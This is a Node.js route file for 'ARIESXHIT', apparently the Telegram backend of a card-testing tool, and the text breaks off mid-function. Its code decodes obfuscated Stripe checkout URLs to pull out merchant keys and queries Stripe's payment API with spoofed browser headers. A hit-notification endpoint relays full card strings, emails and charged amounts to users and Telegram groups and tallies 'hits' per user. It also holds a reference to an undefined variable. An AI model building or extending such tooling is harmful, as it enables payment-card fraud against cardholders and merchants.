// ===================================
// Telegram Bot Routes
// OTP, Verify, Hit Notifications
// ===================================

const express = require('express');
const router = express.Router();
const https = require('https');
const { strictLimiter, createRateLimiter } = require('../middleware/rateLimiter');
const db = require('../config/database');

// Rate limiter for OTP sending (2 per hour per IP)
const otpLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 2,
  message: 'Too many OTP requests, please try again later',
  skipSuccessfulRequests: false,
  skipFailedRequests: true
});

// Rate limiter for OTP verification (5 per hour per IP)
const verifyLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5,
  message: 'Too many verification attempts, please try again later',
  skipSuccessfulRequests: true, // Don't count successful verifications
  skipFailedRequests: false
});

// Rate limiter for token validation (10 per hour per IP)
const tokenLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10,
  message: 'Too many token validation requests, please try again later'
});

// Rate limiter for hit notifications (20 per hour per IP)
const hitLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 20,
  message: 'Too many hit notifications, please try again later'
});
const {
  sendMessage,
  sendPhoto,
  editMessageText,
  MAIN_MENU_KEYBOARD,
  generateOTP,
  setOTP,
  verifyOTP,
  generateLoginToken,
  validateLoginToken,
  getLoginTokenForUser,
  answerCallbackQuery,
  incrementUserHits,
  getUserHits,
  getGlobalHits,
  setUserName,
  getUserName,
  getTopUsers,
  getTopRealUsers,
  getUserRank,
  setUserData,
  getUserData,
  sendHitToGroups,
  detectMerchant,
} = require('../services/telegramService');

// Import checkout service
const checkoutService = require('../services/checkoutService');

// Function to extract BIN from card number
function extractBinFromCard(cardNumber) {
  // Remove spaces, dashes, and other non-digits
  const cleanCard = cardNumber.replace(/[^\d]/g, '');
  // Return first 6 digits (BIN)
  return cleanCard.substring(0, 6);
}

// Function to parse checkout URL like cc script (no stored keys!)
function parseCheckoutUrl(checkoutUrl) {
  const result = {
    sessionId: null,
    publicKey: null,
    site: null,
    success: false
  };

  if (!checkoutUrl) {
    return result;
  }

  try {
    // URL decode the entire URL first (like cc script)
    checkoutUrl = decodeURIComponent(checkoutUrl);

    // Extract session ID (same regex as cc script)
    const sessionMatch = checkoutUrl.match(/cs_(?:live|test)_[A-Za-z0-9]+/);
    if (sessionMatch) {
      result.sessionId = sessionMatch[0];
      console.log('[PARSE_URL] 📋 Session ID:', result.sessionId);
    }

    // Check for key in query parameters (fallback for URLs that have key=pk_xxx)
    try {
      const url = new URL(checkoutUrl);
      const keyParam = url.searchParams.get('key');
      if (keyParam && keyParam.startsWith('pk_')) {
        result.publicKey = keyParam;
        console.log('[PARSE_URL] ✅ Found public key in query params:', result.publicKey.substring(0, 20) + '...');
        result.success = true;
      }
    } catch (urlError) {
      console.log('[PARSE_URL] ⚠️ URL parsing error:', urlError.message);
    }

    // Find fragment after # (like cc script)
    const fragmentPos = checkoutUrl.indexOf('#');
    if (fragmentPos !== -1) {
      const fragment = checkoutUrl.substring(fragmentPos + 1);
      console.log('[PARSE_URL] 🔍 Found fragment:', fragment.substring(0, 50) + '...');

      try {
        // Base64 decode (like cc script)
        const decoded = Buffer.from(decodeURIComponent(fragment), 'base64');
        console.log('[PARSE_URL] 📦 Base64 decoded');

        // XOR decode with key 5 (like cc script XOR_KEY = 5)
        const xorDecoded = decoded.map(byte => byte ^ 5);
        const xorString = Buffer.from(xorDecoded).toString('utf8');
        console.log('[PARSE_URL] 🔐 XOR decoded');

        // Extract public key (like cc script)
        const pkMatch = xorString.match(/pk_(?:live|test)_[A-Za-z0-9]+/);
        if (pkMatch) {
          result.publicKey = pkMatch[0];
          console.log('[PARSE_URL] ✅ Found public key:', result.publicKey.substring(0, 20) + '...');
        }

        // Extract site URL (like cc script)
        const siteMatch = xorString.match(/https?:\/\/[^\s"']+/);
        if (siteMatch) {
          result.site = siteMatch[0];
          console.log('[PARSE_URL] 🌐 Found site URL:', result.site);
        }

        result.success = true;

      } catch (decodeError) {
        console.log('[PARSE_URL] ⚠️ Decode failed, trying direct extraction...');

        // Fallback: try direct regex on fragment
        const directPkMatch = fragment.match(/pk_(?:live|test)_[A-Za-z0-9]+/);
        if (directPkMatch) {
          result.publicKey = directPkMatch[0];
          console.log('[PARSE_URL] ✅ Found public key (direct):', result.publicKey.substring(0, 20) + '...');
          result.success = true;
        }

        const directSiteMatch = fragment.match(/https?:\/\/[^\s"']+/);
        if (directSiteMatch) {
          result.site = directSiteMatch[0];
          console.log('[PARSE_URL] 🌐 Found site URL (direct):', result.site);
        }
      }
    }

  } catch (error) {
    console.error('[PARSE_URL] 💥 Error parsing URL:', error.message);
  }

  console.log('[PARSE_URL] 📊 Parse result:', {
    sessionId: result.sessionId,
    hasPublicKey: !!result.publicKey,
    site: result.site,
    success: result.success
  });

  return result;
}

// Legacy function for backward compatibility
function extractPublishableKey(checkoutUrl) {
  const parsed = parseCheckoutUrl(checkoutUrl);
  return parsed.publicKey;
}

// REMOVED: Page scraping not needed - cc script uses URL parsing instead

// Function to debug/extract all info from checkout URL (like stripe_hitter.py debug)
async function debugCheckoutUrl(checkoutUrl) {
  console.log('[DEBUG_URL] 🔍 Starting comprehensive URL analysis...');
  console.log('[DEBUG_URL] 📝 Full URL:', checkoutUrl);

  const debugInfo = {
    url: checkoutUrl,
    isStripeUrl: false,
    sessionId: null,
    publishableKey: null,
    extracted: false,
    businessUrl: null,
    merchant: null,
    currency: null,
    amount: null,
    description: null,
    accountInfo: null,
    // Additional fields like stripe_hitter.py
    presentmentAmount: null,
    presentmentCurrency: null,
    computedAmount: null,
    amountTotal: null,
    total: null,
    status: null,
    livemode: null,
    configId: null,
    checksum: null,
    totalSummary: null,
    lineItemGroup: null,
    rawResponse: null,
    errors: []
  };

  try {
    // Check if it's a Stripe URL
    debugInfo.isStripeUrl = checkoutUrl.includes('checkout.stripe.com');
    console.log('[DEBUG_URL] 🏪 Is Stripe URL:', debugInfo.isStripeUrl ? 'YES' : 'NO');

    if (!debugInfo.isStripeUrl) {
      debugInfo.errors.push('Not a Stripe checkout URL');
      return debugInfo;
    }

    // Extract session ID
    const sessionMatch = checkoutUrl.match(/cs_(?:live|test)_[A-Za-z0-9]+/);
    if (sessionMatch) {
      debugInfo.sessionId = sessionMatch[0];
      console.log('[DEBUG_URL] 🆔 Session ID:', debugInfo.sessionId);
    } else {
      debugInfo.errors.push('Could not extract session ID');
      return debugInfo;
    }

    // Parse checkout URL like cc script - extract everything dynamically (NO STORED KEYS!)
    const parsedUrl = parseCheckoutUrl(checkoutUrl);

    // Use the parsed results
    debugInfo.publishableKey = parsedUrl.publicKey;
    debugInfo.site = parsedUrl.site;

    // Prepare API keys - ONLY from dynamic extraction (like cc script)
    let apiKeys = [];
    if (debugInfo.publishableKey) {
      apiKeys.push(debugInfo.publishableKey);
    } else {
      console.log('[DEBUG_URL] ❌ No publishable key found in checkout URL');
      debugInfo.errors.push('No publishable key found in checkout URL');
      return debugInfo;
    }

    // Try to fetch checkout info
    for (let i = 0; i < apiKeys.length; i++) {
      const apiKey = apiKeys[i];
      const keyType = i === 0 && debugInfo.publishableKey ? 'EXTRACTED' : 'FALLBACK';

      console.log(`[DEBUG_URL] 🔑 Trying ${keyType} key ${i + 1}/${apiKeys.length}: ${apiKey.substring(0, 20)}...`);

      try {
        const apiUrl = `https://api.stripe.com/v1/payment_pages/${debugInfo.sessionId}?key=${apiKey}&eid=NA`;

        const response = await new Promise((resolve, reject) => {
          const request = https.get(apiUrl, {
            headers: {
              'accept': 'application/json',
              'accept-language': 'en',
              'cache-control': 'no-cache',
              'content-type': 'application/x-www-form-urlencoded',
              'origin': 'https://checkout.stripe.com',
              'referer': 'https://checkout.stripe.com/',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 15000
          }, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);

            res.on('end', () => {
              try {
                const jsonData = JSON.parse(data);
                resolve({ status: res.statusCode, data: jsonData });
              } catch (e) {
                resolve({ status: res.statusCode, data: null, error: e.message });
              }
            });
          });

          request.on('error', (error) => reject(error));
          request.on('timeout', () => {
            request.destroy();
            reject(new Error('Timeout'));
          });
        });

        console.log(`[DEBUG_URL] 📡 API Response Status: ${response.status}`);

        if (response.status === 200 && response.data) {
          debugInfo.extracted = true;
          console.log('[DEBUG_URL] ✅ Successfully extracted checkout info!');

          // Store raw response for debug output
          debugInfo.rawResponse = response.data;

          // Extract business info
          if (response.data.account_settings) {
            const settings = response.data.account_settings;
            debugInfo.businessUrl = settings.business_url || null;
            debugInfo.merchant = settings.display_name || settings.business_url || null;
            debugInfo.accountInfo = {
              accountId: settings.account_id,
              country: settings.country,
              displayName: settings.display_name,
              merchantOfRecord: settings.merchant_of_record_display_name,
              supportEmail: settings.support_email,
              email: response.data.customer_email,
              livemode: response.data.livemode,
              configId: response.data.config_id,
              checksum: response.data.init_checksum
            };
            console.log('[DEBUG_URL] 🏪 Business URL:', debugInfo.businessUrl);
            console.log('[DEBUG_URL] 👤 Merchant:', debugInfo.merchant);
          }

          // Extract payment info (like stripe_hitter.py)
          debugInfo.currency = response.data.currency || null;
          debugInfo.description = response.data.description || null;
          debugInfo.status = response.data.status || null;
          debugInfo.livemode = response.data.livemode;
          debugInfo.configId = response.data.config_id;
          debugInfo.checksum = response.data.init_checksum;

          // Extract amounts (like stripe_hitter.py format)
          if (response.data.amount_total) {
            debugInfo.amount = (response.data.amount_total / 100).toFixed(2);
          } else if (response.data.recurring_details && response.data.recurring_details.total) {
            debugInfo.amount = (response.data.recurring_details.total / 100).toFixed(2);
          } else if (response.data.total_summary && response.data.total_summary.amount) {
            debugInfo.amount = (response.data.total_summary.amount / 100).toFixed(2);
          } else {
            debugInfo.amount = null;
          }
          debugInfo.totalSummary = response.data.total_summary || null;

          // Extract multi-currency fields
          debugInfo.presentmentAmount = response.data.presentment_amount || null;
          debugInfo.presentmentCurrency = response.data.presentment_currency || null;
          debugInfo.computedAmount = response.data.computed_amount || null;
          debugInfo.amountTotal = response.data.amount_total || null;
          debugInfo.total = response.data.total || null;

          // Extract line item group
          debugInfo.lineItemGroup = response.data.line_item_group ?
            typeof response.data.line_item_group : 'None';

          console.log('[DEBUG_URL] 💰 Currency:', debugInfo.currency);
          console.log('[DEBUG_URL] 📄 Description:', debugInfo.description);
          console.log('[DEBUG_URL] 💵 Amount:', debugInfo.amount);

          break; // Success, no need to try more keys

        } else if (response.data && response.data.error) {
          console.log(`[DEBUG_URL] ❌ API Error: ${response.data.error.message}`);
          if (i === apiKeys.length - 1) {
            debugInfo.errors.push(`API Error: ${response.data.error.message}`);
          }
        }

      } catch (error) {
        console.log(`[DEBUG_URL] ⚠️ Request failed: ${error.message}`);
        if (i === apiKeys.length - 1) {
          debugInfo.errors.push(`Request failed: ${error.message}`);
        }
      }
    }

  } catch (error) {
    console.error('[DEBUG_URL] 💥 Unexpected error:', error.message);
    debugInfo.errors.push(`Unexpected error: ${error.message}`);
  }

  console.log('[DEBUG_URL] 📊 Debug Summary:', {
    extracted: debugInfo.extracted,
    merchant: debugInfo.merchant,
    businessUrl: debugInfo.businessUrl,
    errors: debugInfo.errors.length
  });

  return debugInfo;
}

// Function to fetch business_url from Stripe checkout URL
async function fetchBusinessUrlFromStripe(checkoutUrl) {
  try {
    console.log('[FETCH_BUSINESS_URL] 🚀 Starting fetch for:', checkoutUrl);

    // Extract session ID from checkout URL
    const sessionMatch = checkoutUrl.match(/cs_(?:live|test)_[A-Za-z0-9]+/);
    if (!sessionMatch) {
      console.log('[FETCH_BUSINESS_URL] ❌ No session ID found');
      return null;
    }

    const sessionId = sessionMatch[0];
    console.log('[FETCH_BUSINESS_URL] 📋 Session ID:', sessionId);

    // Parse checkout URL like cc script - extract everything dynamically (NO STORED KEYS!)
    const parsedUrl = parseCheckoutUrl(checkoutUrl);

    // Use ONLY the dynamically extracted key (like cc script - no stored keys!)
    let apiKeys = [];
    if (parsedUrl.publicKey) {
      apiKeys.push(parsedUrl.publicKey);
      console.log('[FETCH_BUSINESS_URL] 🎯 Using dynamically extracted key from checkout URL:', parsedUrl.publicKey.substring(0, 20) + '...');
    } else {
      console.log('[FETCH_BUSINESS_URL] ❌ No publishable key found in checkout URL - cannot proceed');
      return null; // Like cc script - if no key found, can't continue
    }

    // Try each API key
    for (let i = 0; i < apiKeys.length; i++) {
      const apiKey = apiKeys[i];
      const keyType = i === 0 && extractedKey ? 'EXTRACTED' : 'FALLBACK';
      console.log(`[FETCH_BUSINESS_URL] 🔑 Trying ${keyType} API key ${i + 1}/${apiKeys.length}: ${apiKey.substring(0, 20)}...`);

      try {
        const apiUrl = `https://api.stripe.com/v1/payment_pages/${sessionId}?key=${apiKey}&eid=NA`;

        const response = await new Promise((resolve, reject) => {
          const request = https.get(apiUrl, {
            headers: {
              'accept': 'application/json',
              'accept-language': 'en',
              'cache-control': 'no-cache',
              'content-type': 'application/x-www-form-urlencoded',
              'origin': 'https://checkout.stripe.com',
              'referer': 'https://checkout.stripe.com/',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 15000
          }, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
              try {
                resolve({ status: res.statusCode, data: JSON.parse(data) });
              } catch (e) {
                resolve({ status: res.statusCode, data: null, error: e.message });
              }
            });
          });

          request.on('error', (error) => reject(error));
          request.on('timeout', () => {
            request.destroy();
            reject(new Error('Timeout'));
          });
        });

        console.log(`[FETCH_BUSINESS_URL] 📡 Response status: ${response.status}`);

        if (response.status === 200 && response.data) {
          console.log('[FETCH_BUSINESS_URL] 🔍 Checking response keys:', Object.keys(response.data));

          if (response.data.business_url) {
            console.log('[FETCH_BUSINESS_URL] ✅ SUCCESS! Found business_url at root:', response.data.business_url);
            return response.data.business_url;
          } else if (response.data.account_settings && response.data.account_settings.business_url) {
            console.log('[FETCH_BUSINESS_URL] ✅ SUCCESS! Found business_url in account_settings:', response.data.account_settings.business_url);
            return response.data.account_settings.business_url;
          }
        } else if (response.data && response.data.error) {
          console.log(`[FETCH_BUSINESS_URL] ⚠️ API Error: ${response.data.error.message}`);
        }

      } catch (error) {
        console.log(`[FETCH_BUSINESS_URL] ⚠️ Request failed: ${error.message}`);
      }
    }

    console.log('[FETCH_BUSINESS_URL] ❌ All API keys failed');
    return null;

  } catch (error) {
    console.error('[FETCH_BUSINESS_URL] 💥 Unexpected error:', error.message);
    return null;
  }
}

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const BOT_USERNAME = process.env.TELEGRAM_BOT_USERNAME || '';

// POST /api/tg/send-otp - Send OTP to user's Telegram
router.post('/send-otp', otpLimiter, async (req, res) => {
  if (!BOT_TOKEN) {
    return res.status(500).json({ ok: false, error: 'Telegram bot not configured. Add TELEGRAM_BOT_TOKEN to .env' });
  }
  const { tg_id } = req.body || {};
  const tgId = String(tg_id || '').trim();

  // Validate Telegram ID format (should be numeric and reasonable length)
  if (!tgId || !/^\d{5,15}$/.test(tgId)) {
    return res.status(400).json({ ok: false, error: 'Invalid Telegram ID format' });
  }
  const token = generateOTP();
  setOTP(tgId, token);
  const otpText = `🔐 <b>ARIESXHIT LOGIN</b>\n` +
    `─────────────────\n\n` +
    `Your verification code:\n\n` +
    `<code>${token}</code>\n\n` +
    `Valid 5 minutes. Enter in extension.`;
  const result = await sendMessage(BOT_TOKEN, tgId, otpText);
  if (result.ok) {
    return res.json({ ok: true });
  }
  return res.status(400).json({ ok: false, error: result.error || 'Failed to send' });
});

// POST /api/tg/verify - Verify OTP token
router.post('/verify', verifyLimiter, async (req, res) => {
  const { tg_id, token } = req.body || {};
  const tgId = String(tg_id || '').trim();
  const userToken = String(token || '').trim();

  // Validate inputs
  if (!tgId || !/^\d{5,15}$/.test(tgId)) {
    return res.status(400).json({ ok: false, error: 'Invalid Telegram ID format' });
  }
  if (!userToken || !/^\d{6}$/.test(userToken)) {
    return res.status(400).json({ ok: false, error: 'Invalid OTP format (must be 6 digits)' });
  }
  if (verifyOTP(tgId, userToken)) {
    return res.json({ ok: true, name: 'User' });
  }
  return res.status(400).json({ ok: false, error: 'Invalid or expired token' });
});

// POST /api/tg/notify-hit - Send hit notification to user's Telegram (with optional screenshot)
router.post('/notify-hit', async (req, res) => {
  console.log('[HIT_NOTIFICATION] 🚨 ENDPOINT CALLED! 🚨');
  console.log('[HIT_NOTIFICATION] Payload keys:', Object.keys(req.body || {}));
  if (!BOT_TOKEN) {
    console.warn('[HIT_NOTIFICATION] Bot token not configured - notifications will fail');
    // Don't reject, just log warning
  }
  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url, business_url } = req.body || {};
  // success_url is no longer sent by extension, so we can remove it from processing
  const tgId = String(tg_id || '').trim();

  // Debug logging for incoming data
  console.log('[HIT_NOTIFICATION] RECEIVED FROM EXTENSION:', {
    tg_id: tgId,
    name: name || 'NO_NAME',
    card: card || 'NO_CARD_DATA',
    attempts: attempts || 'NO_ATTEMPTS',
    amount: amount || 'NO_AMOUNT_DATA',
    email: email || 'NO_EMAIL_DATA',
    time_sec: time_sec || 'NO_TIME',
    current_url: current_url || merchant_url || 'NO_URL'
  });
  console.log('[HIT_NOTIFICATION] Raw request body:', req.body);

  // Accept any Telegram ID for debugging
  console.log('[HIT_NOTIFICATION] Processing with Telegram ID:', tgId);

  // Don't validate - just accept whatever data we get
  console.log('Processing hit notification with data:', { card, attempts, amount, email });
  const userName = name || 'User';
  const tgIdNum = String(tgId).replace(/\D/g, '');
  const nameLink = tgIdNum ? `<a href="tg://user?id=${tgIdNum}">${userName}</a>` : userName;
  const amtDisplay = (amount && String(amount).trim()) || '—';
  let amtFormatted = amtDisplay;
  if (amtDisplay !== 'Free Trial' && amtDisplay !== '—' && !/^[\$€£]/.test(amtDisplay)) {
    const num = amtDisplay.replace(/[^\d.]/g, '') || '0';
    amtFormatted = '₹' + (parseFloat(num).toFixed(2));
  }
  let businessUrl = '—';
  let fullCheckoutUrl = '—';

  // Extract merchant name - prioritize business_url, then auto-fetch from checkout URL, then URL detection, then BIN detection
  let merchantName = 'Payment Processor'; // Default
  console.log('[HIT_NOTIFICATION] Extension data - current_url:', current_url, 'merchant_url:', merchant_url, 'business_url:', business_url);

  // Priority 1: business_url (exact merchant from Stripe checkout session - sent by extension)
  if (business_url && typeof business_url === 'string' && business_url.trim()) {
    merchantName = business_url.replace(/^https?:\/\//, '').replace(/\/$/, '');
    console.log('[HIT_NOTIFICATION] 🎯 EXACT MERCHANT from extension business_url:', merchantName);
  }
  // Priority 2: Auto-fetch business_url from checkout URL using cc script logic
  else if (current_url && current_url.includes('checkout.stripe.com')) {
    try {
      console.log('[HIT_NOTIFICATION] 🔍 Attempting to extract merchant using cc script logic from checkout URL');
      const parsedUrl = parseCheckoutUrl(current_url);
      if (parsedUrl.success && parsedUrl.publicKey) {
        console.log('[HIT_NOTIFICATION] 🎯 CC SCRIPT: Found publishable key, fetching merchant data...');

        // Use the extracted key to get merchant info
        const apiUrl = `https://api.stripe.com/v1/payment_pages/${parsedUrl.sessionId}?key=${parsedUrl.publicKey}&eid=NA`;

        const response = await new Promise((resolve, reject) => {
          const request = https.get(apiUrl, {
            headers: {
              'accept': 'application/json',
              'accept-language': 'en',
              'cache-control': 'no-cache',
              'content-type': 'application/x-www-form-urlencoded',
              'origin': 'https://checkout.stripe.com',
              'referer': 'https://checkout.stripe.com/',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 15000
          }, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
              try {
                resolve({ status: res.statusCode, data: JSON.parse(data) });
              } catch (e) {
                resolve({ status: res.statusCode, data: null, error: e.message });
              }
            });
          });

          request.on('error', (error) => reject(error));
          request.on('timeout', () => {
            request.destroy();
            reject(new Error('Timeout'));
          });
        });

        if (response.status === 200 && response.data) {
          if (response.data.account_settings && response.data.account_settings.business_url) {
            const businessUrl = response.data.account_settings.business_url;
            merchantName = businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
            console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Merchant extracted as:', merchantName);
          } else if (response.data.account_settings && response.data.account_settings.display_name) {
            merchantName = response.data.account_settings.display_name;
            console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Merchant extracted as:', merchantName);
          } else {
            console.log('[HIT_NOTIFICATION] ⚠️ CC SCRIPT: API call successful but no merchant data found');
            merchantName = 'Stripe Checkout';
          }
        } else {
          console.log('[HIT_NOTIFICATION] ❌ CC SCRIPT: API call failed with status:', response.status);
          merchantName = 'Stripe Checkout';
        }
      } else {
        console.log('[HIT_NOTIFICATION] ❌ CC SCRIPT: Could not extract key from checkout URL');
        merchantName = 'Stripe Checkout';
      }
    } catch (error) {
      console.error('[HIT_NOTIFICATION] ❌ CC SCRIPT ERROR:', error.message);
      merchantName = 'Stripe Checkout';
    }
  }
  // Priority 3: URL-based detection
  else if (current_url || merchant_url) {
    const pageUrl = current_url || merchant_url;
    try {
      merchantName = detectMerchant(pageUrl);
      console.log('[HIT_NOTIFICATION] ✅ Detected merchant from URL:', merchantName);
    } catch (error) {
      console.error('[HIT_NOTIFICATION] ❌ Error detecting merchant from URL');
      merchantName = 'Payment Processor';
    }
  } else {
    console.log('[HIT_NOTIFICATION] ❌ No URL provided by extension, using BIN detection');

    // Enhanced BIN-based merchant detection
    const cleanCard = card && card.trim() ? card.replace(/\|/g, '').replace(/\s/g, '') : '';
    if (cleanCard && cleanCard.length >= 6) {
      const bin = cleanCard.substring(0, 6);
      console.log('[HIT_NOTIFICATION] Card BIN detected:', bin);

      // Enhanced BIN patterns for more accurate merchant detection
      if (bin.startsWith('4')) {
        merchantName = 'Visa Payment';
      } else if (bin.startsWith('5') || bin.startsWith('2')) {
        // More specific Mastercard detection
        const binNum = parseInt(bin);
        if (binNum >= 510000 && binNum <= 559999) {
          merchantName = 'Mastercard Payment';
        } else if (binNum >= 222100 && binNum <= 272099) {
          merchantName = 'Mastercard Payment';
        } else {
          merchantName = 'Mastercard Network';
        }
      } else if (bin.startsWith('34') || bin.startsWith('37')) {
        merchantName = 'American Express';
      } else if (bin.startsWith('36') || bin.startsWith('38') || bin.startsWith('39')) {
        merchantName = 'Diners Club';
      } else if (bin.startsWith('35')) {
        merchantName = 'JCB Payment';
      } else if (bin.startsWith('6011') || bin.startsWith('65') || bin.startsWith('644') || bin.startsWith('645') || bin.startsWith('646') || bin.startsWith('647') || bin.startsWith('648') || bin.startsWith('649')) {
        merchantName = 'Discover Payment';
      } else if (bin.startsWith('62')) {
        merchantName = 'China UnionPay';
      } else {
        merchantName = 'Online Payment';
      }

      console.log('[HIT_NOTIFICATION] Using BIN-based merchant detection:', merchantName);
    } else {
      merchantName = 'Online Payment';
      console.log('[HIT_NOTIFICATION] Using generic merchant name');
    }
  }

  // success_url is no longer sent by extension - simplified processing
  console.log('[Telegram] success_url removed from extension payload');
  const cardDisplay = (card && card.trim()) ? card.replace(/\|/g, ' | ') : '—';
  // Debug logging for card data
  if (!card || !card.trim()) {
    console.log('No card data received in hit notification:', { card, attempts, tgId });
  }
  const emailDisplay = (email && String(email).trim()) || '—';
  const timeDisplay = (time_sec != null && time_sec !== '') ? `${time_sec}s` : '—';
  const hitText = `🎯 <b>HIT DETECTED</b>\n` +
    `─────────────────\n\n` +
    `Card :- ${cardDisplay}\n` +
    `Email :- ${emailDisplay}\n` +
    `Merchant :- ${merchantName}\n` +
    `Attempt :- ${attempts ?? '—'}\n` +
    `Amount :- ${amtFormatted}\n` +
    `Time :- ${timeDisplay}\n\n` +
    `Thanks For Using Ariesxhit. ❤️`;
  console.log('[HIT_NOTIFICATION] Sending notification to Telegram user:', tgId);

  let result;
  if (screenshot && typeof screenshot === 'string' && screenshot.length > 100) {
    console.log('[HIT_NOTIFICATION] Sending photo notification');
    result = await sendPhoto(BOT_TOKEN, tgId, screenshot, hitText);
  } else {
    console.log('[HIT_NOTIFICATION] Sending text notification');
    result = await sendMessage(BOT_TOKEN, tgId, hitText);
  }

  // Always attempt group notifications for debugging (even if user message fails)
  console.log('[HIT_NOTIFICATION] Attempting group notifications regardless of user message status');

  const cleanCard = cardDisplay !== '—' ? cardDisplay.replace(' | ', '').replace(/\s/g, '') : '';
  const hitData = {
    userId: tgId,
    userName: userName,
    card: cleanCard || 'Unknown',
    bin: cleanCard ? extractBinFromCard(cleanCard) : 'Unknown',
    binMode: '(extension hit)',
    amount: amtFormatted === 'Free Trial' ? '0.00' : amtFormatted.replace('₹', '').replace(/[^\d.]/g, ''),
    attempts: attempts || 1,
    timeTaken: timeDisplay,
    merchant: merchantName // Use extracted merchant name
  };

    console.log('[HIT_NOTIFICATION] Constructed hitData:', JSON.stringify(hitData, null, 2));
    console.log('[HIT_NOTIFICATION] Merchant name:', merchantName);

    console.log('[HIT_NOTIFICATION] 🚨🚨🚨 IMMEDIATELY BEFORE sendHitToGroups CALL 🚨🚨🚨');
    console.log('[HIT_NOTIFICATION] hitData prepared:', JSON.stringify(hitData, null, 2));

    try {
      console.log('[HIT_NOTIFICATION] 📞 CALLING sendHitToGroups NOW...');
      // For extension hits, we don't have a checkout URL, so pass a generic one
      await sendHitToGroups(hitData, 'https://extension-hit.com');
      console.log('[HIT_NOTIFICATION] ✅✅✅ sendHitToGroups FINISHED SUCCESSFULLY ✅✅✅');
    } catch (groupError) {
      console.error('[HIT_NOTIFICATION] ❌❌❌ sendHitToGroups CRASHED ❌❌❌');
      console.error('[HIT_NOTIFICATION] Error:', groupError.message);
      console.error('[HIT_NOTIFICATION] Stack:', groupError.stack);
    }

  if (result.ok) {
    console.log('[HIT_NOTIFICATION] Notification sent successfully, incrementing hits for user:', tgId);
    incrementUserHits(tgId);
  } else {
    console.error('[HIT_NOTIFICATION] Failed to send notification:', result.error);
  }

  return res.json({ ok: result.ok, error: result.error });
});

// GET /api/tg/business-url - Fetch business_url from checkout URL
router.get('/business-url', async (req, res) => {
  const checkoutUrl = req.query.url;

  if (!checkoutUrl || !checkoutUrl.includes('checkout.stripe.com')) {
    return res.status(400).json({ ok: false, error: 'Invalid checkout URL' });
  }

  try {
    console.log('[BUSINESS_URL_ENDPOINT] Fetching for URL:', checkoutUrl);
    const businessUrl = await fetchBusinessUrlFromStripe(checkoutUrl);

    if (businessUrl) {
      // Clean the business_url
      const cleanMerchant = businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
      res.json({
        ok: true,
        business_url: businessUrl,
        merchant: cleanMerchant,
        checkout_url: checkoutUrl
      });
    } else {
      res.status(404).json({
        ok: false,
        error: 'Could not find business_url for this checkout',
        checkout_url: checkoutUrl
      });
    }
  } catch (error) {
    console.error('[BUSINESS_URL_ENDPOINT] Error:', error);
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// GET /api/tg/debug-url - Comprehensive URL debugging (like stripe_hitter.py debug)
router.get('/debug-url', async (req, res) => {
  console.log('[DEBUG_ENDPOINT] Starting comprehensive URL debug...');

  try {
    const checkoutUrl = req.query.url;
    if (!checkoutUrl) {
      return res.status(400).json({ ok: false, error: 'Missing url parameter' });
    }

    const debugInfo = await debugCheckoutUrl(checkoutUrl);

    // Format response like stripe_hitter.py debug output
    let debugOutput = '';

    // Header
    debugOutput += '='.repeat(60) + '\n';
    debugOutput += '         STRIPE CHECKOUT DEBUG - ARIESxHIT\n';
    debugOutput += '='.repeat(60) + '\n\n';

    // Session and Key info
    debugOutput += `[*] Session: ${debugInfo.sessionId || 'Not found'}\n`;
    debugOutput += `[*] Key: ${debugInfo.publishableKey ? debugInfo.publishableKey.substring(0, 20) + '...' : 'Not found'}\n\n`;

    // Checkout Info section
    debugOutput += '='.repeat(60) + '\n';
    debugOutput += 'CHECKOUT INFO:\n';
    debugOutput += '='.repeat(60) + '\n';

    if (debugInfo.extracted) {
      // Format amount like stripe_hitter.py: "1100 (11.00 USD)"
      let amountDisplay = 'Not available';
      if (debugInfo.rawResponse?.recurring_details?.total) {
        const cents = debugInfo.rawResponse.recurring_details.total;
        const dollars = (cents / 100).toFixed(2);
        const currency = debugInfo.currency?.toUpperCase() || 'USD';
        amountDisplay = `${cents} (${dollars} ${currency})`;
      }
      debugOutput += `Amount: ${amountDisplay}\n`;
      debugOutput += `Currency: ${debugInfo.currency?.toUpperCase() || 'Not available'}\n\n`;

      debugOutput += `[Multi-Currency Fields]\n`;
      debugOutput += `presentment_amount: ${debugInfo.presentmentAmount || 'None'}\n`;
      debugOutput += `presentment_currency: ${debugInfo.presentmentCurrency || 'None'}\n`;
      debugOutput += `computed_amount: ${debugInfo.computedAmount || 'None'}\n`;
      debugOutput += `amount_total: ${debugInfo.amountTotal || 'None'}\n`;
      debugOutput += `total: ${debugInfo.total || 'None'}\n`;

      debugOutput += `Email: ${debugInfo.accountInfo?.email || 'Not available'}\n`;
      debugOutput += `Status: ${debugInfo.status || 'Not available'}\n`;
      debugOutput += `Mode: ${debugInfo.accountInfo?.livemode ? 'LIVE' : 'TEST'}\n`;
      debugOutput += `Config ID: ${debugInfo.accountInfo?.configId || 'Not available'}\n`;
      debugOutput += `Checksum: ${debugInfo.accountInfo?.checksum ? debugInfo.accountInfo.checksum.substring(0, 50) + '...' : 'Not available'}\n\n`;

      debugOutput += `Merchant: ${debugInfo.merchant || 'Not available'}\n`;
      debugOutput += `Support: ${debugInfo.accountInfo?.supportEmail || 'Not available'}\n\n`;

      // All keys section (simulate stripe_hitter.py format)
      const allKeys = [
        'id', 'object', 'account_settings', 'allow_promotion_codes', 'application',
